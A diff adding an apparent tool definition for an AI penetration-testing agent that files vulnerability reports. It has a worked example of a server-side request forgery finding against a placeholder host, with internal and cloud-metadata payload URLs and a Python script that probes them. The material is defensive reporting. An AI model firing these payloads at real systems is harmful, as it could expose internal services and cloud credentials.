@@ -1,0 +1,278 @@
+<tools>
+  <tool name="create_vulnerability_report">
+    <description>Create a vulnerability report for a discovered security issue.
+
+IMPORTANT: This tool includes automatic LLM-based deduplication. Reports that describe the same vulnerability (same root cause on the same asset) as an existing report will be rejected.
+
+Use this tool to document a specific fully verified security vulnerability.
+
+DO NOT USE:
+- For general security observations without specific vulnerabilities
+- When you don't have concrete vulnerability details
+- When you don't have a proof of concept, or still not 100% sure if it's a vulnerability
+- For tracking multiple vulnerabilities (create separate reports)
+- For reporting multiple vulnerabilities at once. Use a separate create_vulnerability_report for each vulnerability.
+- To re-report a vulnerability that was already reported (even with different details)
+
+White-box requirement (when you have access to the code): You MUST include code_file, code_before, code_after, and code_diff. These must contain the actual code (before/after) and a complete, apply-able unified diff.
+
+DEDUPLICATION: If this tool returns with success=false and mentions a duplicate, DO NOT attempt to re-submit. The vulnerability has already been reported. Move on to testing other areas.
+
+Professional, customer-facing report rules (PDF-ready):
+- Do NOT include internal or system details: never mention local or absolute paths (e.g., "/workspace"), internal tools, agents, orchestrators, sandboxes, models, system prompts/instructions, connection issues, internal errors/logs/stack traces, or tester machine environment details.
+- Tone and style: formal, objective, third-person, vendor-neutral, concise. No runbooks, checklists, or engineering notes. Avoid headings like "QUICK", "Approach", or "Techniques" that read like internal guidance.
+- Use a standard penetration testing report structure per finding:
+  1) Overview
+  2) Severity and CVSS (vector only)
+  3) Affected asset(s)
+  4) Technical details
+  5) Proof of concept (repro steps plus code)
+  6) Impact
+  7) Remediation
+  8) Evidence (optional request/response excerpts, etc.) in the technical analysis field.
+- Numbered steps are allowed ONLY within the proof of concept. Elsewhere, use clear, concise paragraphs suitable for customer-facing reports.
+- Language must be precise and non-vague; avoid hedging.
+</description>
+    <parameters>
+      <parameter name="title" type="string" required="true">
+        <description>Clear, specific title (e.g., "SQL Injection in /api/users Login Parameter"). But not too long. Don't mention CVE number in the title.</description>
+      </parameter>
+      <parameter name="description" type="string" required="true">
+        <description>Comprehensive description of the vulnerability and how it was discovered</description>
+      </parameter>
+      <parameter name="impact" type="string" required="true">
+        <description>Impact assessment: what attacker can do, business risk, data at risk</description>
+      </parameter>
+      <parameter name="target" type="string" required="true">
+        <description>Affected target: URL, domain, or Git repository</description>
+      </parameter>
+      <parameter name="technical_analysis" type="string" required="true">
+        <description>Technical explanation of the vulnerability mechanism and root cause</description>
+      </parameter>
+      <parameter name="poc_description" type="string" required="true">
+        <description>Step-by-step instructions to reproduce the vulnerability</description>
+      </parameter>
+      <parameter name="poc_script_code" type="string" required="true">
+        <description>Actual proof of concept code, exploit, payload, or script that demonstrates the vulnerability. Python code.</description>
+      </parameter>
+      <parameter name="remediation_steps" type="string" required="true">
+        <description>Specific, actionable steps to fix the vulnerability</description>
+      </parameter>
+      <parameter name="attack_vector" type="string" required="true">
+        <description>CVSS Attack Vector - How the vulnerability is exploited:
+N = Network (remotely exploitable)
+A = Adjacent (same network segment)
+L = Local (local access required)
+P = Physical (physical access required)</description>
+      </parameter>
+      <parameter name="attack_complexity" type="string" required="true">
+        <description>CVSS Attack Complexity - Conditions beyond attacker's control:
+L = Low (no special conditions)
+H = High (special conditions must exist)</description>
+      </parameter>
+      <parameter name="privileges_required" type="string" required="true">
+        <description>CVSS Privileges Required - Level of privileges needed:
+N = None (no privileges needed)
+L = Low (basic user privileges)
+H = High (admin privileges)</description>
+      </parameter>
+      <parameter name="user_interaction" type="string" required="true">
+        <description>CVSS User Interaction - Does exploit require user action:
+N = None (no user interaction needed)
+R = Required (user must perform some action)</description>
+      </parameter>
+      <parameter name="scope" type="string" required="true">
+        <description>CVSS Scope - Can the vulnerability affect resources beyond its security scope:
+U = Unchanged (only affects the vulnerable component)
+C = Changed (affects resources beyond vulnerable component)</description>
+      </parameter>
+      <parameter name="confidentiality" type="string" required="true">
+        <description>CVSS Confidentiality Impact - Impact to confidentiality:
+N = None (no impact)
+L = Low (some information disclosure)
+H = High (all information disclosed)</description>
+      </parameter>
+      <parameter name="integrity" type="string" required="true">
+        <description>CVSS Integrity Impact - Impact to integrity:
+N = None (no impact)
+L = Low (data can be modified but scope is limited)
+H = High (total loss of integrity)</description>
+      </parameter>
+      <parameter name="availability" type="string" required="true">
+        <description>CVSS Availability Impact - Impact to availability:
+N = None (no impact)
+L = Low (reduced performance or interruptions)
+H = High (total loss of availability)</description>
+      </parameter>
+      <parameter name="endpoint" type="string" required="false">
+        <description>API endpoint(s) or URL path(s) (e.g., "/api/login") - for web vulnerabilities, or Git repository path(s) - for code vulnerabilities</description>
+      </parameter>
+      <parameter name="method" type="string" required="false">
+        <description>HTTP method(s) (GET, POST, etc.) - for web vulnerabilities.</description>
+      </parameter>
+      <parameter name="cve" type="string" required="false">
+        <description>CVE identifier (e.g., "CVE-2024-1234"). Make sure it's a valid CVE. Use web search or vulnerability databases to make sure it's a valid CVE number.</description>
+      </parameter>
+      <parameter name="code_file" type="string" required="false">
+        <description>MANDATORY for white-box testing: exact affected source file path(s).</description>
+      </parameter>
+      <parameter name="code_before" type="string" required="false">
+        <description>MANDATORY for white-box testing: actual vulnerable code snippet(s) copied verbatim from the repository.</description>
+      </parameter>
+      <parameter name="code_after" type="string" required="false">
+        <description>MANDATORY for white-box testing: corrected code snippet(s) exactly as they should appear after the fix.</description>
+      </parameter>
+      <parameter name="code_diff" type="string" required="false">
+        <description>MANDATORY for white-box testing: unified diff showing the code changes. Must be a complete, apply-able unified diff (git format) covering all affected files, with proper file headers, line numbers, and sufficient context.</description>
+      </parameter>
+    </parameters>
+    <returns type="Dict[str, Any]">
+      <description>Response containing:
+- On success: success=true, message, report_id, severity, cvss_score
+- On duplicate detection: success=false, message (with duplicate info), duplicate_of (ID), duplicate_title, confidence (0-1), reason (why it's a duplicate)</description>
+    </returns>
+
+    <examples>
+<function=create_vulnerability_report>
+<parameter=title>Server-Side Request Forgery (SSRF) via URL Preview Feature Enables Internal Network Access</parameter>
+<parameter=description>A server-side request forgery (SSRF) vulnerability was identified in the URL preview feature that generates rich previews for user-supplied links.
+
+The application performs server-side HTTP requests to retrieve metadata (title, description, thumbnails). Insufficient validation of the destination allows an attacker to coerce the server into making requests to internal network hosts and link-local addresses that are not directly reachable from the internet.
+
+This issue is particularly high risk in cloud-hosted environments where link-local metadata services may expose sensitive information (e.g., instance identifiers, temporary credentials) if reachable from the application runtime.</parameter>
+<parameter=impact>Successful exploitation may allow an attacker to:
+
+- Reach internal-only services (admin panels, service discovery endpoints, unauthenticated microservices)
+- Enumerate internal network topology based on timing and response differences
+- Access link-local services that should never be reachable from user input paths
+- Potentially retrieve sensitive configuration data and temporary credentials in certain hosting environments
+
+Business impact includes increased likelihood of lateral movement, data exposure from internal systems, and compromise of cloud resources if credentials are obtained.</parameter>
+<parameter=target>https://app.acme-corp.com</parameter>
+<parameter=technical_analysis>The vulnerable behavior occurs when the application accepts a user-controlled URL and fetches it server-side to generate a preview. The response body and/or selected metadata fields are then returned to the client.
+
+Observed security gaps:
+- No robust allowlist of approved outbound domains
+- No effective blocking of private, loopback, and link-local address ranges
+- Redirect handling can be leveraged to reach disallowed destinations if not revalidated after following redirects
+- DNS resolution and IP validation appear to occur without normalization safeguards, creating bypass risk (e.g., encoded IPs, mixed IPv6 notation, DNS rebinding scenarios)
+
+As a result, an attacker can supply a URL that resolves to an internal destination. The server performs the request from a privileged network position, and the attacker can infer results via returned preview content or measurable response differences.</parameter>
+<parameter=poc_description>To reproduce:
+
+1. Authenticate to the application as a standard user.
+2. Navigate to the link preview feature (e.g., “Add Link”, “Preview URL”, or equivalent UI).
+3. Submit a URL pointing to an internal resource. Example payloads:
+
+   - http://127.0.0.1:80/
+   - http://localhost:8080/
+   - http://10.0.0.1:80/
+   - http://169.254.169.254/ (link-local)
+
+4. Observe that the server attempts to fetch the destination and returns either:
+   - Preview content/metadata from the target, or
+   - Error/timing differences that confirm network reachability.
+
+Impact validation:
+- Use a controlled internal endpoint (or a benign endpoint that returns a distinct marker) to demonstrate that the request is performed by the server, not the client.
+- If the application follows redirects, validate whether an allowlisted URL can redirect to a disallowed destination, and whether the redirected-to destination is still fetched.</parameter>
+<parameter=poc_script_code>import json
+import sys
+import time
+from urllib.parse import urljoin
+
+import requests
+
+BASE = "https://app.acme-corp.com"
+PREVIEW_ENDPOINT = urljoin(BASE, "/api/v1/link-preview")
+
+SESSION_COOKIE = ""  # Set to your authenticated session cookie value if needed
+
+TARGETS = [
+    "http://127.0.0.1:80/",
+    "http://localhost:8080/",
+    "http://10.0.0.1:80/",
+    "http://169.254.169.254/",
+]
+
+
+def preview(url: str) -> tuple[int, float, str]:
+    headers = {
+        "Content-Type": "application/json",
+    }
+    cookies = {}
+    if SESSION_COOKIE:
+        cookies["session"] = SESSION_COOKIE
+
+    payload = {"url": url}
+    start = time.time()
+    resp = requests.post(PREVIEW_ENDPOINT, headers=headers, cookies=cookies, data=json.dumps(payload), timeout=15)
+    elapsed = time.time() - start
+
+    body = resp.text
+    snippet = body[:500]
+    return resp.status_code, elapsed, snippet
+
+
+def main() -> int:
+    print(f"Endpoint: {PREVIEW_ENDPOINT}")
+    print("Testing SSRF candidates (server-side fetch behavior):")
+    print()
+
+    for url in TARGETS:
+        try:
+            status, elapsed, snippet = preview(url)
+            print(f"URL: {url}")
+            print(f"Status: {status}")
+            print(f"Elapsed: {elapsed:.2f}s")
+            print("Body (first 500 chars):")
+            print(snippet)
+            print("-" * 60)
+        except requests.RequestException as e:
+            print(f"URL: {url}")
+            print(f"Request failed: {e}")
+            print("-" * 60)
+
+    return 0
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())</parameter>
+<parameter=remediation_steps>Implement layered SSRF defenses:
+
+1. Explicit allowlist for outbound destinations
+   - Only permit fetching from a maintained set of approved domains (and required schemes).
+   - Reject all other destinations by default.
+
+2. Robust IP range blocking after DNS resolution
+   - Resolve the hostname and block private, loopback, link-local, and reserved ranges for both IPv4 and IPv6.
+   - Re-validate on every redirect hop; do not follow redirects to disallowed destinations.
+
+3. URL normalization and parser hardening
+   - Normalize and validate the URL using a strict parser.
+   - Reject ambiguous encodings and unusual notations that can bypass filters.
+
+4. Network egress controls (defense in depth)
+   - Enforce outbound firewall rules so the application runtime cannot reach sensitive internal ranges or link-local addresses.
+   - If previews are required, route outbound requests through a dedicated egress proxy with policy enforcement and auditing.
+
+5. Response handling hardening
+   - Avoid returning raw response bodies from previews.
+   - Strictly limit what metadata is returned and apply size/time limits to outbound fetches.
+
+6. Monitoring and alerting
+   - Log and alert on preview attempts to unusual destinations, repeated failures, high-frequency requests, or attempts to access blocked ranges.</parameter>
+<parameter=attack_vector>N</parameter>
+<parameter=attack_complexity>L</parameter>
+<parameter=privileges_required>L</parameter>
+<parameter=user_interaction>N</parameter>
+<parameter=scope>C</parameter>
+<parameter=confidentiality>H</parameter>
+<parameter=integrity>H</parameter>
+<parameter=availability>L</parameter>
+<parameter=endpoint>/api/v1/link-preview</parameter>
+<parameter=method>POST</parameter>
+</function>
+    </examples>
+  </tool>
+</tools>
